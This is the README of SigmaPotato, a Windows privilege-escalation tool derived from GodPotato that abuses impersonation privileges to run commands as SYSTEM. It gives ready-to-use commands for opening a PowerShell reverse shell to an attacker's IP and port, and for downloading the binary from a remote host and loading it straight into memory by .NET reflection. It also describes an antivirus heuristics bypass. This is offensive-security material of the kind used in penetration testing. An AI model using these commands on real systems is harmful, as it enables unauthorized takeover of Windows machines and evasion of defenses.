
This gaudy repository is a derivative of the [GodPotato](https://github.com/BeichenDream/GodPotato) project, 
aiming to enhance the original work's functionality and user-friendliness.  With my bread-and-butter generally
being PowerShell implementation and visual formatting, the primary focus is on enhancing PowerShell support
and output verbosity for a more intuitive and effective user experience.

![Banner](https://github.com/tylerdotrar/SigmaPotato/assets/69973771/2db4310b-1ceb-4c24-b1f0-963102cc280c)


# Table of Contents <a name="toc"></a>

1. [**Added Functionality over the Original GodPotato**](#functionality)
2. [**General Usage**](#usage)
    - [**Usage from Disk via the Binary**](#binaries)
	- [**Usage from Memory via .NET Reflection**](#reflection)
	- [**Error Correction**](#errors)
	- [**Examples**](#examples)
3. [**Windows OS Version Compatibility**](#compatibility)
4. [**Credits & Thanks**](#credits)
	- [**BeichenDream**](#beichendream)
	- [**NukingDragons**](#nukingdragons)
5. [**License**](#license)

# Added Functionality over the Original GodPotato <a name="functionality"></a>

## v1.0.0
```
[+] Support for execution from memory via .NET reflection.
    o (allows privilege escalation without writing a binary to disk)
    o (help page includes syntax for both local and remote reflection)
	
[+] Built in reverse shell functionality using '--revshell'.
    o (reverse shell is a custom PowerShell-based payload)
	
[+] Bypassed the 1024 max character limit when executing PowerShell commands.
    o (accomplished via exploiting process environment block inheritance)
    o (theoretical character limit: 32,767)
	
[+] Streamlined tool usage by utilizing implied variables over specified variables.
    o (e.g., no more needing to specifiy the '-cmd' parameter)
	
[+] Enhanced visual formatting of PowerShell process output.
    o (e.g., voiding PowerShell's serialization format "#< CLIXML")
	
[+] Increased output verbosity and visual formatting.
    o (error output verbosity by including suggestions for common error messages)
    o (process outputting and usage help vastly improved)
```

## v1.2.5
```
[+] Streamlined usage when using .NET reflection.
    o (e.g., can now be executed via "[SigmaPotato]::Main('<command>')")
    
[+] Improved reverse shell stability and verbosity.
    o (better error correction and now intercepts console data streams)
    
[+] Further refined visual formatting.
    o (cleaned up help message, hints, and general output)
    
```

## v1.2.6
```
[+] Added rudimentary AV heuristics bypass by calling an uncommon API.
    o (calling 'VirtualAllocExNuma()' should fail when being analyzed by heuristics engines)
    o (will still likely get caught by most up-to-date Windows Defender w/ Real-time protection)
    
[+] Cleaned up '--help' message.
    o (minor tweaks and spacing)
```

## Work-in-Progress (WIP)
```
[+] Introduce '--interactive' process support.
    o (this will require 'SeAssignPrimaryTokenPrivilege')
    
[+] Save process output to exported environment variable.
    o (save output of the execute process/command to "$env:SigmaOutput")
    o (will likely only be applicable when using reflection) 
```

[**Return to Table of Contents**](#toc)


# General Usage <a name="usage"></a>

**Requirements:**
```txt
Run as a user with 'SeImpersonatePrivilege' (or 'SeAssignPrimaryTokenPrivilege') user rights.
```

Checking the help message with ``--help``

![Help](https://github.com/tylerdotrar/SigmaPotato/assets/69973771/502c6770-923f-465a-9f24-8577c2141a31)


[**Return to Table of Contents**](#toc)


## Usage from Disk via the Binary <a name="binaries"></a>

The easiest way to use ``SigmaPotato`` is by interacting with the binary like you would any other program.
```powershell
# Execute a Command
./SigmaPotato.exe <command>


# Establish a PowerShell Reverse Shell
./SigmaPotato.exe --revshell <ip_addr> <port>


# Return Help Information
./SigmaPotato.exe --help
```

[**Return to Table of Contents**](#toc)


## Usage from Memory via .NET Reflection <a name="reflection"></a>


Prior to privilege escalation, we need to load ``SigmaPotato`` into memory using .NET reflection.

```powershell
# Load from a Local Binary already on Disk
[System.Reflection.Assembly]::LoadFile("$PWD/SigmaPotato.exe")


# Load from a Remotely Hosted Binary via a WebClient
$WebClient = New-Object System.Net.WebClient
$DownloadData = $WebClient.DownloadData("http(s)://<ip_addr>/SigmaPotato.exe")
[System.Reflection.Assembly]::Load($DownloadData)


# Load from a Remotely Hosted Binary via a WebClient (one-liner)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http(s)://<ip_addr>/SigmaPotato.exe"))
```
- Note: running a simple HTTP server is sufficient for hosting (e.g., ``python -m http.server 80``)
---

Once the ``SigmaPotato`` namespace has been loaded into the current session, you can use it for privilege escalation.

```powershell
# Execute a Command
[SigmaPotato]::Main("<command>")


# Establish a PowerShell Reverse Shell
$RevShell = @("--revshell", "<ip_addr>", "<port>")
[SigmaPotato]::Main($RevShell)


# Establish a PowerShell Reverse Shell (one-liner)
[SigmaPotato]::Main(@("--revshell","<ip_address>","<port>"))
```
- Note: as of ``v1.2.5``, execution no longer requires ``[SigmaPotato.Program]``

[**Return to Table of Contents**](#toc)


## Error Correction <a name="errors"></a>


I made an active effort to document the majority of errors I came accross.
Hopefully this effort allows any error you come across to be quickly diagnosed.

### General Usage Corrections

```txt
PS C:\Users\JoeSchmoe> .\SigmaPotato.exe
[-] No arguments detected.  Use '--help' for usage information.


PS C:\Users\JoeSchmoe> .\SigmaPotato.exe cmd.exe /c whoami
[-] Unexpected arguments detected.  Use '--help' for usage information.
 o  (Hint: you might need to wrap your arguments in quotations)


PS C:\Users\JoeSchmoe> .\SigmaPotato.exe --revshell
[-] Reverse shell functionality is missing arguments.  Use '--help' for usage information.
 o  (Hint: you need to specify an IP address and port)
```

### Invalid Filename (or Filename not in the Default Path)

![Invalid Filename](https://github.com/tylerdotrar/SigmaPotato/assets/69973771/84955f9e-8d5c-4a2a-991b-096e35ac51d4)

### Command Exceeds the Character Limit
_(Note: this error wouldn't occur if the command was prefaced with "powershell")_

![Command Too Long](https://github.com/tylerdotrar/SigmaPotato/assets/69973771/42b2ba76-8665-44b8-85cd-c76deebca282)

### User does not have 'SeImpersonatePrivilege' (or 'SeAssignPrimaryTokenPrivilege') User Rights

![Invalid Privileges](https://github.com/tylerdotrar/SigmaPotato/assets/69973771/3a6b4637-2f36-40e3-a97a-f7132501cd54)

[**Return to Table of Contents**](#toc)


## Examples <a name="examples"></a>


Below are two examples of ``SigmaPotato.exe`` usage.

1. **Simple Example:** Using ``--revshell`` functionality when using the binary.
2. **Advanced Example:** Using .NET reflection and a custom SSL PowerShell reverse shell payload that exceeds the 1024 character limit.  The custom reverse shell was  created using the `Get-RevShell` script from my [PoorMansArmory](https://github.com/tylerdotrar/PoorMansArmory) repository.

**Simple Example:**

![Binary --revshell](https://github.com/tylerdotrar/SigmaPotato/assets/69973771/c1b48322-098a-42f1-8e8e-0441a239128f)

**Advanced Example:**

![Reflection w/ Custom Payload](https://github.com/tylerdotrar/SigmaPotato/assets/69973771/d009d9d0-eb33-47b8-82f9-70e60c1f57c9)

[**Return to Table of Contents**](#toc)


# Windows OS Version Compatibility <a name="compatibility"></a>

For this project I compiled two different binaries for maximum compatibility.  The default
**``SigmaPotato.exe``** has been tested and validated on a fresh installation of every Windows
operating system, from **``Windows 8/8.1 to Windows 11``** *and* **``Windows Server 2012 to Windows
Server 2019``**. The only *"issue"* with this binary is that .NET reflection does not work with PowerShell Core.

The separate **``SigmaPotatoCore.exe``** was compiled with .NET Framework v2.0 and supports .NET
reflection on PowerShell Core / .NET Core.  The downside is that this binary then requires
.NET Framework v3.5 (2.0 + 3.0) to be installed on the target system to work via normal binary 
execution.  So if you plan to only use reflection, this version would be optimal.

**TL;DR**

| Version | Compiled w/ | Binary Compatibility | Reflection Compatibility |
| --- | --- | --- | --- |
| **``SigmaPotato.exe``** | .NET Framework: ``v4.8`` | .NET Framework: ``Any`` | .NET Framework: ``Any (Non-Core)`` |
| **``SigmaPotatoCore.exe``** | .NET Framework: ``v2.0`` | .NET Framework: ``v3.5`` | .NET Framework: ``Any`` |

| Vulnerable Windows Versions |
| --- |
| Windows 8/8.1 - Windows 11 |
| Windows Server 2012 - Windows 2022 |

[**Return to Table of Contents**](#toc)


# Credits & Thanks <a name="credits"></a>

- Enormous credit to [@BeichenDream](https://github.com/BeichenDream) for the original [GodPotato](https://github.com/BeichenDream/GodPotato) project.  I couldn't have made any of this without his
hard work. <a name="beichendream"></a>

- Huge shoutout to [@NukingDragons](https://github.com/nukingdragons) for being way smarter than me
and helping with the local environment block bootstrap. <a name="nukingdragons"></a>

[**Return to Table of Contents**](#toc)

---

# License <a name="license"></a>

- [Apache License 2.0](/LICENSE)
